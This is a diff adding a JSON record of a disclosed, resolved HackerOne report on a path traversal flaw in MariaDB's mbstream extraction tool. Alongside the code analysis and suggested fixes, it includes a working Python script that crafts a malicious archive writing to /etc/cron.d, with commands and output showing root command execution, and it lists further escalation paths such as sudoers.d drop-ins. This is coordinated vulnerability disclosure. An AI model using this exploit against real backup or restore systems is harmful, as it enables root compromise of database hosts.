@@ -1,0 +1,131 @@
+{
+  "id": 3678395,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjc4Mzk1",
+  "url": "https://hackerone.com/reports/3678395",
+  "title": "Path Traversal in mbstream Extract",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2026-04-16T15:54:07.087Z",
+  "submitted_at": "2026-04-16T15:54:07.654Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "riscj",
+    "url": "/riscj",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 8724,
+    "url": "https://hackerone.com/mariadb",
+    "handle": "mariadb",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/008/724/6a67872926e894490b4fdc36cd6a3f59e300616b_original.png/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MariaDB",
+      "twitter_handle": "mariadb_org",
+      "website": "https://mariadb.org",
+      "about": "MariaDB is a high performance, open source database that helps the world's busiest websites deliver more content, faster."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2018-1002200",
+    "CVE-2018-1002201"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-10-03T12:57:48.124Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2026-09-03T12:57:34.757Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\n\nThe xbstream extraction code in `mbstream` (the first-party extraction utility shipped in the `mariadb-backup` package) does not reject `..` path components in archive chunk paths. The current safeguard, `MY_RELATIVE_PATH` passed to `fn_format()`, prevents absolute paths but does not prevent directory traversal via relative paths such as `../../etc/cron.d/evil`. As a result, a malicious `.xbstream` archive can cause extraction to create files outside the chosen target directory, at attacker-controlled paths permitted by the extracting user's privileges.\n\nThis is an archive-extraction path traversal vulnerability (CWE-22, Zip Slip class). The file-creation primitive permits out-of-target file creation whenever an archive with a `..`-prefixed chunk path reaches `mbstream -x` and the kernel-resolved parent of the traversal target exists with appropriate permissions. In common configurations (restores running as `root` with cron installed), this primitive escalates to root command execution through standard writable drop-in locations such as `/etc/cron.d/`. An end-to-end exploit was verified on MariaDB 12.2.2 on Debian 12: delivering a single malicious `.xbstream` file caused root command execution via cron within ~60 seconds of extraction.\n\n#### Exploit prerequisites\n\nTo reach RCE the following must hold:\n\n- Attacker must be able to supply or influence the contents of an `.xbstream` archive that the victim later extracts (delivery channels include backup buckets, replication seeding, DR pipelines, Kubernetes operator backup volumes, scheduled restore verification jobs, etc.).\n- Victim must run `mbstream -x` on the attacker-influenced archive. \n- The privilege level of the extracting user determines the impact. Restore pipelines commonly run as `root` (escalation to root code execution via writable drop-in directories like `/etc/cron.d/`); pipelines running as the `mysql` user are still subject to the underlying file-creation primitive.\n\nThe vulnerability permits out-of-target file creation once an attacker-supplied archive reaches the extractor; whether that primitive escalates to command execution depends on the privileges of the extracting user and on which writable execution paths are available on the target.\n\n### Environment\n\n- **Confirmed on**: MariaDB 12.2.2-MariaDB-deb12, package `mariadb-backup_1:12.2.2+maria~deb12_amd64.deb` from the official MariaDB repository, Debian 12 (Bookworm) x86_64.\n- **Suspected affected** (not independently verified): other maintained MariaDB branches containing the same `ds_local.cc` / `mf_format.c` / `xbstream.cc` logic. The vulnerable code has been in `extra/mariabackup/ds_local.cc:local_open()` and `mysys/mf_format.c` since these features were introduced and appears unchanged across branches based on code inspection.\n- **Plugins/Configuration**: None required. `mariadb-backup` is the packaged physical-backup tool that ships alongside MariaDB. The path-traversal vulnerability itself is broadly Linux-applicable; the cron-based RCE escalation is one practical exploitation route on systems with cron installed and `mariadb-backup` running as root\n\n### Affected Code\n\n`extra/mariabackup/ds_local.cc`, lines 89-118: the `local_open()` function used to create files during xbstream extraction:\n\n```c\nstatic ds_file_t *\nlocal_open(ds_ctxt_t *ctxt, const char *path, MY_STAT *mystat)\n{\n    char fullpath[FN_REFLEN];\n    char dirpath[FN_REFLEN];\n    size_t dirpath_len;\n    ...\n    fn_format(fullpath, path, ctxt->root, \"\", MYF(MY_RELATIVE_PATH));    // (1)\n\n    dirname_part(dirpath, fullpath, &dirpath_len);\n    if (my_mkdir(dirpath, 0777, MYF(0)) < 0 && my_errno != EEXIST) {     // (2)\n        ...\n    }\n\n    fd = my_create(fullpath, 0, O_WRONLY | O_BINARY | O_EXCL | O_NOFOLLOW,\n                   MYF(MY_WME));                                          // (3)\n    ...\n}\n```\n\n(1) `MY_RELATIVE_PATH` is intended to constrain `path` underneath `ctxt->root`. The implementation in `mysys/mf_format.c:46-52` only checks whether `path` is \"hard\" (absolute):\n\n```c\nelse if ((flag & MY_RELATIVE_PATH) && !test_if_hard_path(dev))\n{\n    /* Put 'dir' before the given path */\n    pos = convert_dirname(dev, dir, NullS);\n    strmake(pos, buff, ...);\n}\n```\n\n`test_if_hard_path()` (`mysys/my_getwd.c:132`) classifies as \"hard\" only paths starting with `/` or `~/`. A path like `../../etc/cron.d/evil` is therefore considered \"relative\" and is simply prepended with the target directory:\n\n- target dir: `/tmp/restore`\n- chunk path: `../../etc/cron.d/evil`\n- `fullpath`: `/tmp/restore/../../etc/cron.d/evil`\n- after kernel resolves `..`: `/etc/cron.d/evil`\n\n(2) No userspace normalization of `..` occurs anywhere in this code path. `dirname_part()` strips the trailing component to derive `dirpath` but leaves any `..` segments in place; `my_mkdir()` and (later) `my_create()` then pass the un-normalized string straight to the kernel, which resolves `..` at the syscall boundary. So `dirpath` literally is `/tmp/restore/../../etc/cron.d/`, and the kernel resolves it to `/etc/cron.d/` when `mkdir(2)` runs. `EEXIST` is silently tolerated (line 106), so the call succeeds for any traversal target whose resolved parent directory already exists, which covers all the realistic exploitation targets (`/etc/cron.d`, `/etc/profile.d`, `/etc/sudoers.d`, etc.).\n\n(3) `my_create()` opens the file with `O_EXCL | O_NOFOLLOW`. This means existing files cannot be overwritten and symlinks are not followed, but **new** files can be created at the traversed location, which is sufficient for the attack.\n\nThe xbstream chunk path is read directly from the archive header in `extra/mariabackup/xbstream_read.cc:144-160` and passed to `local_open()` at `extra/mariabackup/xbstream.cc:334` (`file = ds_open(ctxt->ds_ctxt, path, NULL);`) without any sanitization beyond a length cap of `FN_REFLEN`.\n\n### Reproduction\n\nThe PoC generates a minimal valid xbstream archive containing one payload chunk and one EOF chunk, both carrying a `../`-prefixed path. The cron.d variant below demonstrates end-to-end root code execution from a single delivered archive.\n\n#### Helper script\n\nSave as `craft_evil_xbstream.py`:\n\n```python\n#!/usr/bin/env python3\n\"\"\"Craft a minimal xbstream containing one payload chunk and one EOF chunk.\nUsage:  craft_evil_xbstream.py <CHUNK_PATH> <PAYLOAD_BYTES> <OUTFILE>\n\"\"\"\nimport struct, zlib, sys\n\nCHUNK_MAGIC = b'XBSTCK01'\nTYPE_PAYLOAD = b'P'\nTYPE_EOF = b'E'\n\ndef make_payload_chunk(path: bytes, payload: bytes) -> bytes:\n    out  = CHUNK_MAGIC\n    out += b'\\x00'                          # flags = 0\n    out += TYPE_PAYLOAD                     # type = 'P'\n    out += struct.pack('<I', len(path))     # path length (LE)\n    out += path\n    out += struct.pack('<Q', len(payload))  # payload length (8 bytes LE)\n    out += struct.pack('<Q', 0)             # offset in source file\n    out += struct.pack('<I', zlib.crc32(payload) & 0xFFFFFFFF)\n    out += payload\n    return out\n\ndef make_eof_chunk(path: bytes = b'eof') -> bytes:\n    out  = CHUNK_MAGIC + b'\\x00' + TYPE_EOF\n    out += struct.pack('<I', len(path)) + path\n    return out\n\nwith open(sys.argv[3], 'wb') as f:\n    f.write(make_payload_chunk(sys.argv[1].encode(), sys.argv[2].encode()))\n    f.write(make_eof_chunk(sys.argv[1].encode()))\nprint('wrote', sys.argv[3])\n```\n\n#### End-to-end root RCE via `/etc/cron.d`\n\nThe chunk path traverses to `/etc/cron.d/evil`; the payload is a valid cron entry that runs a command as root every minute.\n\n```bash\npython3 craft_evil_xbstream.py \\\n    '../../etc/cron.d/evil' \\\n    '* * * * * root touch /tmp/CRON_PROOF\n' \\\n    /tmp/evil.xbstream\n\nrm -f /tmp/CRON_PROOF /etc/cron.d/evil\nmkdir -p /tmp/restore_target\n\nmbstream -x -C /tmp/restore_target < /tmp/evil.xbstream\n\nls -la /etc/cron.d/evil\ncat /etc/cron.d/evil\n\nfor i in $(seq 1 70); do\n    if [ -f /tmp/CRON_PROOF ]; then\n        echo \"[+] CRON FIRED after ${i}s\"\n        ls -la /tmp/CRON_PROOF\n        break\n    fi\n    sleep 1\ndone\n```\n\nVerbatim output on test VM:\n\n```\nwrote /tmp/evil.xbstream\n-rw-r----- 1 root root 37 Apr 16 10:09 /etc/cron.d/evil\n* * * * * root touch /tmp/CRON_PROOF\n[+] CRON FIRED after 40s\n-rw-r--r-- 1 root root 0 Apr 16 10:10 /tmp/CRON_PROOF\n```\n\nEnd-to-end RCE confirmed: a single delivered `.xbstream` archive yielded root code execution within 60 seconds of extraction (40s in this run, depending on when extraction completes relative to cron's next minute boundary). No prior shell access on the target host is required; the attacker only needs a path to supply a malicious archive into a restore workflow. The chain is:\n\n1. `mbstream -x` extracts the archive, traversing out of the target directory.\n2. `/etc/cron.d/evil` is created with the attacker's cron entry.\n3. `crond` re-reads `/etc/cron.d/` and schedules the new job.\n4. On the next minute boundary, the job runs as root, executing `touch /tmp/CRON_PROOF` (or any attacker-chosen command).\n\n### Suggested Fix\n\nAnchor extraction to a fixed dirfd opened on `ctxt->root` and reach every extracted file via `openat()`/`mkdirat()` with explicit per-component validation. This eliminates the entire class of path-resolution race conditions in addition to fixing the immediate bug. The algorithm:\n\n1. **Once, when the local datasink is created**, open `ctxt->root` with `O_RDONLY | O_DIRECTORY | O_CLOEXEC` and store the fd as `ctxt->rootfd`.\n2. **For each chunk** received from the xbstream parser, replace the `fn_format` -> `my_mkdir` -> `my_create` chain in `local_open()` with a path walker that:\n   - Splits the chunk path on `/`.\n   - For each path component, refuses if the component is empty, `.`, `..`, or contains characters disallowed for filenames (NUL, etc.). Refusing `..` here is the primary fix.\n   - For each non-final component, calls `mkdirat(current_dirfd, component, 0755)` (tolerating `EEXIST`) and `openat(current_dirfd, component, O_RDONLY | O_DIRECTORY | O_NOFOLLOW | O_CLOEXEC)`, then advances `current_dirfd` to the new fd and closes the previous one.\n   - For the final component, calls `openat(current_dirfd, component, O_WRONLY | O_CREAT | O_EXCL | O_NOFOLLOW, mode)` to create the leaf file.\n3. The walk starts with `current_dirfd = dup(ctxt->rootfd)` so each chunk extraction begins from the trusted anchor and never resolves `..` against the host filesystem.\n\nEssential properties:\n\n- `openat()` against a fixed `rootfd`, never against attacker-controlled absolute paths.\n- One component at a time; `..` and absolute segments are rejected lexically before any syscall sees them.\n- `O_NOFOLLOW` on every intermediate `openat()` defeats symlink-swap races where an attacker creates a symlink between the safety check and the eventual `open()`.\n- `O_DIRECTORY` on each intermediate ensures the descent fails fast if a non-directory was substituted.\n\nAs a minimum stopgap if the above refactor is too invasive, a string-level filter applied to `path` before `ds_open()` prevents the obvious traversal. This is shallow, as string filters on filesystem paths have a long history of bypass tricks, but it does close the immediate vulnerability:\n\n```c\nstatic bool path_is_safe(const char *path) {\n    /* No absolute or home paths */\n    if (path[0] == '/' || path[0] == '~')\n        return false;\n    /* No \"..\", \"../\", \"/..\", or any embedded \"/../\" */\n    if (!strcmp(path, \"..\") || !strncmp(path, \"../\", 3))\n        return false;\n    if (strstr(path, \"/../\") != NULL)\n        return false;\n    size_t n = strlen(path);\n    if (n >= 3 && !strcmp(path + n - 3, \"/..\"))\n        return false;\n    return true;\n}\n\n/* In file_entry_new() before ds_open(): */\nif (!path_is_safe(path)) {\n    msg(\"xbstream: refusing unsafe path '%s'\", path);\n    return NULL;\n}\n```\n\nThe `realpath()`-on-parent approach is a middle ground: canonicalize the parent directory of the constructed `fullpath` (`realpath()` on the leaf fails because the leaf does not yet exist) and verify the canonicalized parent is still under `ctxt->root`. This still has TOCTOU exposure between the check and the subsequent `open()`, which the `openat()`-with-dirfd pattern avoids.\n\n## Impact\n\n**Arbitrary new-file creation as the user running `mbstream -x`, anywhere on the filesystem the extracting user is permitted to create files and the kernel-resolved parent directory already exists.** When extraction runs as `root` (the common case for restore operations), the primitive can be escalated to root command execution by writing a new file into a privileged drop-in directory:\n\n| Drop-in target | Mechanism | Time to command execution |\n|---|---|---|\n| `/etc/cron.d/evil` | `crond` watches the directory and picks up new files; runs at next minute boundary | ~60 seconds |\n| `/etc/sudoers.d/evil` | sudo evaluates new drop-ins on next invocation; `attacker ALL=(ALL) NOPASSWD: ALL` grants any user full sudo | next sudo call |\n| `/etc/profile.d/evil.sh` | shell sources files in this directory on next interactive login | next login |\n| `/etc/ld.so.preload` | loader honours this file on every subsequent `exec()` (only viable when the file does not already exist, since `O_EXCL` blocks overwrite) | next process spawn |\n| `~/.ssh/authorized_keys` | sshd grants login if `.ssh/` exists but `authorized_keys` does not | immediately |\n\nThe cron.d path was verified end-to-end on the test VM (Debian 12, MariaDB 12.2.2 from the official package): a single attacker-supplied `.xbstream` file, processed by `mbstream -x` under root, yielded execution of `touch /tmp/CRON_PROOF` as root 40 seconds later.\n\nThe attack requires no MariaDB credentials. It requires only that the attacker influence the contents of one `.xbstream` file that the victim later extracts. Realistic delivery channels include:\n\n1. **Backup-restore pipelines** that pull `.xbstream` files from S3, NFS, HTTP, or SFTP and extract on the local host. Anyone with write access to the source store can craft a malicious archive. Backup buckets are frequently lower-trust than the database itself (separate IAM, separate retention policy).\n2. **Replication seeding / DR site provisioning**, where a new replica receives a stream from a \"donor\" host. A compromised donor could deliver a malicious stream.\n3. **Cross-environment promotion**: an attacker on a lower-trust environment (dev, staging) plants a malicious `.xbstream` in a shared backup spool that the higher-trust environment (prod) consumes during its weekly restore drill.\n4. **Kubernetes operators**: the `mariadb-operator` project runs `mbstream -x -C <dir> < <file>` during restore (`pkg/command/backup.go:316,470`), as `root` inside the operator pod. An attacker with write access to the backup PVC, S3 bucket, or other backing store can plant a malicious archive that triggers the bug on every restore the operator performs. In this configuration the user-interaction requirement effectively disappears (the operator extracts automatically), raising CVSS to ~8.8.\n5. **Backup verification automation** (cron jobs, CI, monitoring) that periodically restores backups to a sandbox host to verify integrity. The sandbox host runs `mbstream -x` on archives whose source the verification job inherently treats as untrusted.\n\nEven without cron, the underlying out-of-target file-creation primitive still permits unauthorized file creation, which can corrupt system state, poison application configuration, plant files for later execution by other code paths, or cause denial of service. \n\nThis is the same vulnerability class as Zip Slip (Snyk, 2018), which received CVE assignments and fixes across the ecosystem (CVE-2018-1002200, CVE-2018-1002201, and dozens of language-specific archive-library CVEs) at CVSS scores in the 7-9 range.",
+  "weakness": {
+    "id": 19,
+    "name": "Path Traversal"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2026-10-03T12:57:34.961Z",
+  "allow_singular_disclosure_after": -14451.866684453,
+  "singular_disclosure_allowed": true,
+  "vote_count": 3,
+  "voters": [
+    "bmx69",
+    "hexa34",
+    "mpink"
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 7.8,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "required",
+      "scope": "unchanged",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 10334,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "MariaDB Server & Connectors - Remote Code Execution",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
